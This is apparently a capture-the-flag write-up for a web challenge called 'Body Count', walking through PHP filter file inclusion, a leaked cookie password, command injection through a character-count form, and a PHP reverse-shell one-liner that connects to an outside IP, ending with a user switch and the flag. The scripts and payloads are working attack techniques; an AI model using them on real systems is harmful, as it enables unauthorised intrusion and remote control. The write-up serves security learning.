# Body Count

Going to the challenge URL has `?file=wc.php` so we do a php filter to get the contents of the file:

```sh
#!/bin/sh

curl --silent "http://chall.csivit.com:30202/?file=php://filter/convert.base64-encode/resource=${1}" -H 'Cookie: password=PASSWORD;' | base64 -d
```

```html
╭─zoey@virtual-parrot ~/sec/csictf/body-count ‹master*› 
╰─$ ./do-lfi.sh wc.php     
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>wc as a service</title>
    <style>
        html,
        body {
            overflow: none;
            max-height: 100vh;
        }
    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
    <?php
    ini_set('max_execution_time', 5);
    if ($_COOKIE['password'] !== getenv('PASSWORD')) {
        setcookie('password', 'PASSWORD');
        die('Sorry, only people from csivit are allowed to access this page.');
    }
    ?>

    <h1>Character Count as a Service</h1>
    <form>
        <input type="hidden" value="wc.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="text" rows=30 cols=100></textarea><br />
        <input type="submit">
    </form>
    <?php
    if (isset($_GET["text"])) {
        $text = $_GET["text"];
        echo "<h2>The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "</h2>";
    }
    ?>
</body>

</html>
```

```
robots.txt has
Disallow: /?file=checkpass.php
```

```php
╭─zoey@virtual-parrot ~/sec/csictf/body-count ‹master*› 
╰─$ ./do-lfi.sh checkpass.php
<?php
$password = "w0rdc0unt123";
// Cookie password.
echo "IMPORTANT!!! The page is still under development. This has a secret, do not push this page.";

header('Location: /');
```

Script for command injection

```sh
#!/bin/sh

curl --silent -G "http://chall.csivit.com:30202/" --data-urlencode "file=wc.php" --data-urlencode "text='; ${1} | base64 -w 0 && false && echo '" -H "Cookie: password=w0rdc0unt123" | grep "Count is:" | sed 's/    <h2>The Character Count is: //' | sed 's/<\/h2><\/body>//' | base64 -d
```

README file has a hash that we crack and the password is csictf

```sh
╭─zoey@virtual-parrot ~/sec/csictf/body-count ‹master*› 
╰─$ ./ci.sh "cat /ctf/README"
My password hash is 6f246c872cbf0b7fd7530b7aa235e67e.
```

Setup a reverse shell after trying things, then use php

```sh
╭─zoey@virtual-parrot ~/sec/csictf/body-count ‹master*› 
╰─$ ./ci.sh $'php -r \'$sock=fsockopen("52.14.18.129",12979);exec("/bin/sh -i <&3 >&3 2>&3");\''
```

Now lets change the user and get the flag

```sh
╭─zoey@virtual-parrot ~ 
╰─$ nc -lvp 22473
listening on [any] 22473 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 46986
/bin/sh: 0: can't access tty; job control turned off
$ ls
checkpass.php
index.php
robots.txt
wc.php
$ sudo -u ctf               
/bin/sh: 2: sudo: not found
$ su ctf
Password: csictf
whoami
ctf
cd /ctf
ls
README
avenged
dream
findaas
led
system
cd system/of/a/down/
ls
flag.txt
cat flag.txt
csictf{1nj3ct10n_15_p41nfu1}
```